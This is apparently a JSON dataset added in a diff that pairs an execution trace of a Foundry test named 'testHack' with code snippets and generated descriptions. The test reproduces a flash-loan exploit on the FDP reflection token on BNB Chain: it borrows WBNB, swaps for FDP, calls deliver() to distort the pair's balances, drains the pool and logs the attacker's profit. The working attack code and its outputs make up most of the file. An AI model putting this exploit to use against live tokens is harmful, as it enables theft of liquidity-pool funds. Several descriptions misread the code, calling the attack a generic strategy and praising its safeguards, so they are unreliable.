@@ -1,0 +1,289 @@
+[
+    {
+        "id": "380438",
+        "args": "",
+        "original_code": "    function testHack() external {\n        vm.createSelectFork(\"https://1rpc.io/bnb\", 25_430_418);\n\n        // flashloan 16.32 WBNB\n        DPP.flashLoan(16.32 ether, 0, address(this), \"0x1\");\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `testHack` function is designed to simulate a specific operation involving a flash loan. It first sets up a simulated environment by forking the Binance Smart Chain (BNB) at a specific block height. Then, it initiates a flash loan for 16.32 WBNB (Wrapped Binance Coin) using the `DPP.flashLoan` function. The purpose of this function is likely to test or demonstrate a scenario where a flash loan is used, possibly for arbitrage, liquidation, or other DeFi strategies.\n\n2. **Security mechanism:**  \n   The function uses `vm.createSelectFork` to create a controlled testing environment, which isolates the operation from the live blockchain. This ensures that the test does not affect real funds or the main network. The `external` modifier restricts the function to be called only from outside the contract, preventing internal misuse. However, the function does not include additional security checks like access control or input validation, which might be necessary in a production environment.\n\n3. **Parameter Function:**  \n   - `vm.createSelectFork(\"https://1rpc.io/bnb\", 25_430_418)`: This sets up a simulated blockchain environment using the provided RPC URL and block height.  \n   - `DPP.flashLoan(16.32 ether, 0, address(this), \"0x1\")`: This initiates a flash loan. The parameters are:  \n     - `16.32 ether`: The amount of WBNB to borrow.  \n     - `0`: The fee or additional amount to repay (set to 0 here).  \n     - `address(this)`: The address of the contract initiating the loan.  \n     - `\"0x1\"`: A data parameter, often used to pass additional information or instructions.  \n\n4. **Return description:**  \n   The function does not return any value. Its primary purpose is to execute the flash loan operation within the simulated environment. The result of the flash loan (e.g., success or failure) would depend on the implementation of the `DPP.flashLoan` function and the logic of the contract handling the loan.  \n\nIn summary, the `testHack` function is a testing tool that simulates a flash loan operation in a controlled environment. It uses a forked blockchain to ensure safety and isolation but lacks additional security measures for real-world use. The function does not return any value but focuses on executing the flash loan process.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"<rpc url>\", 25430418 [2.543e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "373094",
+        "args": "16320000000000000000 [1.632e19], 0, Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x307831",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "29962",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16320000000000000000 [1.632e19]",
+        "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   - The `transfer` function allows the sender (the person calling the function) to send a specific amount of tokens to another address. It directly moves tokens from the sender's account to the recipient's account.  \n   - The `transferFrom` function allows a third party (someone other than the token owner) to transfer tokens on behalf of the owner, provided the owner has given approval for this action. It checks if the third party has sufficient allowance to perform the transfer and then moves the tokens.  \n\n2. **Security mechanism:**  \n   - Both functions use the `external` modifier, meaning they can only be called from outside the contract, ensuring internal logic is protected.  \n   - The `transferFrom` function includes a check to ensure the caller has sufficient allowance (permission) to transfer tokens on behalf of the owner. If the allowance is not unlimited (`uint(-1)`), it reduces the allowance by the transferred amount to prevent overuse.  \n   - Both functions rely on an internal `_transfer` function, which likely includes additional checks to ensure valid transfers (e.g., sufficient balance, valid addresses).  \n\n3. **Parameter Function:**  \n   - For `transfer`:  \n     - `to`: The address of the recipient who will receive the tokens.  \n     - `value`: The amount of tokens to be transferred.  \n   - For `transferFrom`:  \n     - `from`: The address of the token owner who is allowing the transfer.  \n     - `to`: The address of the recipient who will receive the tokens.  \n     - `value`: The amount of tokens to be transferred.  \n\n4. **Return description:**  \n   - Both functions return a boolean value (`true`) to indicate that the transfer was successful. This is a standard practice to confirm the operation completed without errors.  \n\n**In summary,**  \n- The `transfer` function enables direct token transfers between accounts, while `transferFrom` allows approved third parties to transfer tokens on behalf of the owner. Both functions include checks to ensure security and validity, and they return `true` to confirm successful execution.",
+        "return_value": "true"
+    },
+    {
+        "id": "314289",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16320000000000000000 [1.632e19], 0, 0x307831",
+        "original_code": "    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {\n        // console.log(\"%s FDP in Pair before swap\", FDP.balanceOf(address(FDP_WBNB)) / 1e18);  // putting console.log here make test fail ?\n\n        // swap some WBNB to FDP\n        WBNB.approve(address(router), type(uint256).max);\n        FDP.approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(FDP);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            16.32 ether, 0, path, address(this), type(uint256).max\n        );\n\n        console.log(\"%s FDP in Pair before deliver\", FDP.balanceOf(address(FDP_WBNB)) / 1e18);\n        console.log(\"%s FDP in attack contract before deliver\", FDP.balanceOf(address(this)) / 1e18);\n        console.log(\"-------------Delivering-------------\");\n        // 49925109590047580102880 in attack contract before deliver\n        FDP.deliver(28_463.16 ether); // 28463162603585437380302 (8 decimals)\n\n        console.log(\"%s FDP in Pair after deliver\", FDP.balanceOf(address(FDP_WBNB)) / 1e18);\n        console.log(\"%s FDP in attack contract after deliver\", FDP.balanceOf(address(this)) / 1e18);\n\n        FDP_WBNB.swap(\n            0,\n            WBNB.balanceOf(address(FDP_WBNB)) - 0.15 ether, // 32.44 ether\n            address(this),\n            \"\"\n        );\n\n        // repay\n        WBNB.transfer(address(DPP), baseAmount);\n        console.log(\"\\n Attacker's profit: %s WBNB\", WBNB.balanceOf(address(this)) / 1e18);\n    }\n",
+        "description": "1. Core functions:  \nThis function is designed to execute a flash loan operation, which involves borrowing a large amount of tokens temporarily, performing specific actions, and repaying the loan within the same transaction. The function swaps WBNB (Wrapped Binance Coin) for FDP (a token), delivers a specific amount of FDP, and then swaps back to WBNB. Finally, it repays the borrowed amount and calculates the attacker's profit in WBNB.\n\n2. Security mechanism:  \nThe function uses `external` visibility, meaning it can only be called from outside the contract. It also includes `approve` calls to allow the router to spend WBNB and FDP tokens on behalf of the contract. The `swapExactTokensForTokensSupportingFeeOnTransferTokens` function ensures the swap supports tokens with transfer fees. Additionally, the function logs key steps for monitoring and debugging purposes.\n\n3. Parameter Function:  \nThe function takes four parameters:  \n- `address`: This is unused in the function.  \n- `baseAmount`: Represents the amount of WBNB to be repaid after the flash loan.  \n- `uint256`: This is unused in the function.  \n- `bytes calldata`: This is unused in the function.  \n\n4. Return description:  \nThe function does not return any value. Instead, it performs a series of operations, including swapping tokens, delivering FDP, and repaying the flash loan. The profit is calculated and logged as the remaining WBNB balance in the contract after all operations are completed.\n\nIn summary,  \nThis function executes a flash loan strategy involving token swaps and repayments. It uses approvals and logging for security and monitoring. The `baseAmount` parameter determines the repayment amount, and the function calculates and logs the attacker's profit in WBNB.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "24420",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `approve` function allows the caller (the owner of tokens) to grant permission to another address (`spender`) to spend a specific amount of tokens (`value`) on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. **Security mechanism:**  \n   - The function uses the `external` modifier, meaning it can only be called from outside the contract, ensuring it is not invoked internally.  \n   - It relies on the `_approve` internal function to handle the actual approval logic, which helps encapsulate and secure the approval process.  \n\n3. **Parameter Function:**  \n   - `spender`: The address of the account that is being granted permission to spend tokens.  \n   - `value`: The maximum amount of tokens the `spender` is allowed to spend.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the approval process was successful. This is a standard practice in ERC-20 token contracts to confirm the operation.  \n\nIn summary, the `approve` function enables token owners to authorize others to spend their tokens, uses modifiers to restrict access, and returns `true` to confirm the approval.",
+        "return_value": "true"
+    },
+    {
+        "id": "24681",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "139129",
+        "args": "16320000000000000000 [1.632e19], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "8225",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3, 16320000000000000000 [1.632e19]",
+        "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions**:  \n   This function allows one address (`from`) to transfer a specific amount of tokens (`value`) to another address (`to`). It is commonly used when a user has given permission to another user (or contract) to manage their tokens. The function checks if the allowed amount is sufficient and then performs the transfer.\n\n2. **Security mechanism**:  \n   - The function uses `external`, which means it can only be called from outside the contract, ensuring internal state changes are controlled.  \n   - It checks if the `allowance` (the amount the `from` address has permitted the caller to spend) is not set to the maximum value (`uint(-1)`). If not, it reduces the allowance by the transferred amount to prevent overspending.  \n   - The `sub(value)` operation ensures the allowance is safely reduced without underflow issues.  \n   - The `_transfer` function (not shown here) is assumed to handle the actual transfer securely, likely including additional checks like balance verification.  \n\n3. **Parameter Function**:  \n   - `from`: The address from which tokens are being transferred.  \n   - `to`: The address receiving the tokens.  \n   - `value`: The amount of tokens to transfer.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the transfer was successful. This is a standard practice in such functions to confirm the operation completed as expected.  \n\nIn summary, this function securely transfers tokens from one address to another, ensuring the caller has the necessary allowance and updating the allowance accordingly. It returns `true` to confirm the transfer was successful.",
+        "return_value": "true"
+    },
+    {
+        "id": "21152",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n    \n",
+        "description": "1. **Core functions:**  \n   The `balanceOf` function is designed to check and return the token balance of a specific account. It first checks if the account is excluded from certain features (like rewards or fees). If the account is excluded, it directly returns the balance stored in `_tOwned`. If not, it calculates the balance by converting the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function.  \n\n2. **Security mechanism:**  \n   - The function is marked as `public view`, meaning it can be called by anyone but does not modify the state of the contract, ensuring it is safe to use.  \n   - The `override` keyword indicates that this function is overriding a function from a parent contract, ensuring consistency with the expected behavior.  \n   - The function does not directly expose sensitive data or allow for state changes, reducing potential risks.  \n\n3. **Parameter Function:**  \n   The function takes one parameter, `account`, which is the address of the user whose token balance is being queried. This address is used to look up the balance in either `_tOwned` or `_rOwned`, depending on whether the account is excluded or not.  \n\n4. **Return description:**  \n   The function returns a `uint256` value representing the token balance of the specified account. If the account is excluded, it directly returns the value from `_tOwned`. If not, it converts the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function and returns the result.  \n\nIn summary, the `balanceOf` function is a simple yet essential utility that retrieves the token balance of a given account, handling both excluded and non-excluded accounts appropriately while ensuring security and consistency.",
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000152cc9d81eaf81523c0c000000000000000000000000000000000000000000000000e294189c79d4b8d20000000000000000000000000000000000000000000000000000000060bbd33a"
+    },
+    {
+        "id": "534",
+        "args": "0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3",
+        "original_code": null,
+        "description": null,
+        "return_value": "32646701609462839506 [3.264e19]"
+    },
+    {
+        "id": "91481",
+        "args": "49925109590047580102880 [4.992e22], 0, Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));\n        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
+        "description": "1. **Core functions**:  \nThe `swap` function is designed to facilitate the exchange of two different tokens within a decentralized exchange (DEX) system. It allows users to swap one token for another by specifying the amounts they want to receive (`amount0Out` and `amount1Out`). The function ensures that the exchange is executed securely by checking the available reserves of the tokens, transferring the tokens to the recipient, and updating the reserves after the swap. Additionally, it supports a callback mechanism (`pancakeCall`) for more complex interactions if needed.\n\n2. **Security mechanism**:  \nThe function includes several security measures:  \n- **`lock` modifier**: Prevents reentrancy attacks by ensuring the function cannot be called again before the current execution is complete.  \n- **`require` statements**: Validate that the output amounts are greater than zero, the requested amounts do not exceed the available reserves, and the recipient address is not one of the token addresses.  \n- **Balance checks**: Ensures that the input amounts are sufficient to maintain the system's liquidity and that the adjusted balances meet the required conditions to preserve the exchange's stability.  \n- **`_safeTransfer`**: Safely transfers tokens to the recipient, reducing the risk of errors or vulnerabilities.  \n\n3. **Parameter Function**:  \n- **`amount0Out` and `amount1Out`**: These parameters specify the amounts of the two tokens that the user wants to receive from the swap. At least one of these must be greater than zero.  \n- **`to`**: The address of the recipient who will receive the swapped tokens.  \n- **`data`**: Optional data that can be used for additional functionality, such as triggering a callback function (`pancakeCall`) for more complex operations.  \n\n4. **Return description**:  \nThe function does not return any value directly. Instead, it performs the following calculations and actions:  \n- It calculates the input amounts (`amount0In` and `amount1In`) by comparing the updated balances with the reserves after the swap.  \n- It adjusts the balances by applying a fee (0.25%) and ensures that the product of the adjusted balances meets the required condition to maintain the exchange's liquidity.  \n- Finally, it updates the reserves and emits a `Swap` event to log the transaction details.  \n\n**In summary**, the `swap` function enables secure token exchanges in a decentralized exchange by validating inputs, transferring tokens, and updating reserves while incorporating multiple security measures to prevent vulnerabilities.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "52486",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 49925109590047580102880 [4.992e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "5152",
+        "args": "0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3",
+        "original_code": null,
+        "description": null,
+        "return_value": "50070843098193920432940 [5.007e22]"
+    },
+    {
+        "id": "534",
+        "args": "0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3",
+        "original_code": null,
+        "description": null,
+        "return_value": "32646701609462839506 [3.264e19]"
+    },
+    {
+        "id": "5152",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "49925109590047580102880 [4.992e22]"
+    },
+    {
+        "id": "5152",
+        "args": "0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3",
+        "original_code": null,
+        "description": null,
+        "return_value": "50070843098193920432940 [5.007e22]"
+    },
+    {
+        "id": "0",
+        "args": "\"%s FDP in Pair before deliver\", 50070 [5.007e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5152",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "49925109590047580102880 [4.992e22]"
+    },
+    {
+        "id": "0",
+        "args": "\"%s FDP in attack contract before deliver\", 49925 [4.992e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"-------------Delivering-------------\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "31732",
+        "args": "28463160000000000000000 [2.846e22]",
+        "original_code": "    function deliver(uint256 tAmount) public {\n        address sender = _msgSender();\n",
+        "description": "1. Core functions:\n   The `deliver` function is designed to process a specific amount of tokens (represented by `tAmount`) and perform an action related to the sender of the transaction. The primary role of this function is to handle the delivery or transfer of tokens based on the input amount provided.\n\n2. Security mechanism:\n   The function uses `_msgSender()` to securely identify the address of the caller. This is a common practice in Solidity to ensure that the function correctly identifies the sender of the transaction, which helps prevent unauthorized access or manipulation. There are no explicit modifiers like `onlyOwner` or `nonReentrant` in this function, so additional security measures would need to be implemented elsewhere in the contract if required.\n\n3. Parameter Function:\n   The function takes one parameter, `tAmount`, which represents the amount of tokens to be delivered or processed. This parameter is crucial as it determines the quantity of tokens involved in the operation. The function relies on this input to execute its logic.\n\n4. Return description:\n   The function does not return any value. It is a `void` function, meaning it performs an action (likely related to token delivery) but does not produce an output that can be used elsewhere in the contract or by external callers.\n\nIn summary, the `deliver` function is a straightforward utility that processes a specified amount of tokens based on the sender's address. It uses `_msgSender()` for secure identification but does not include additional security features or return any value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "5152",
+        "args": "0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3",
+        "original_code": null,
+        "description": null,
+        "return_value": "11124332801853764113675419 [1.112e25]"
+    },
+    {
+        "id": "0",
+        "args": "\"%s FDP in Pair after deliver\", 11124332 [1.112e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5152",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4768241456371843363743920 [4.768e24]"
+    },
+    {
+        "id": "0",
+        "args": "\"%s FDP in attack contract after deliver\", 4768241 [4.768e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3",
+        "original_code": null,
+        "description": null,
+        "return_value": "32646701609462839506 [3.264e19]"
+    },
+    {
+        "id": "42876",
+        "args": "0, 32496701609462839506 [3.249e19], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23162",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32496701609462839506 [3.249e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "5152",
+        "args": "0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3",
+        "original_code": null,
+        "description": null,
+        "return_value": "11124332801853764113675419 [1.112e25]"
+    },
+    {
+        "id": "534",
+        "args": "0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3",
+        "original_code": null,
+        "description": null,
+        "return_value": "150000000000000000 [1.5e17]"
+    },
+    {
+        "id": "3262",
+        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, 16320000000000000000 [1.632e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "16176701609462839506 [1.617e19]"
+    },
+    {
+        "id": "0",
+        "args": "\"\\n Attacker's profit: %s WBNB\", 16",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681",
+        "original_code": null,
+        "description": null,
+        "return_value": "1363426920555815103015 [1.363e21]"
+    },
+    {
+        "id": "2531",
+        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681",
+        "original_code": null,
+        "description": null,
+        "return_value": "550947305608116485336872 [5.509e23]"
+    },
+    {
+        "id": "534",
+        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681",
+        "original_code": null,
+        "description": null,
+        "return_value": "1363426920555815103015 [1.363e21]"
+    },
+    {
+        "id": "531",
+        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681",
+        "original_code": null,
+        "description": null,
+        "return_value": "550947305608116485336872 [5.509e23]"
+    },
+    {
+        "id": "23756",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
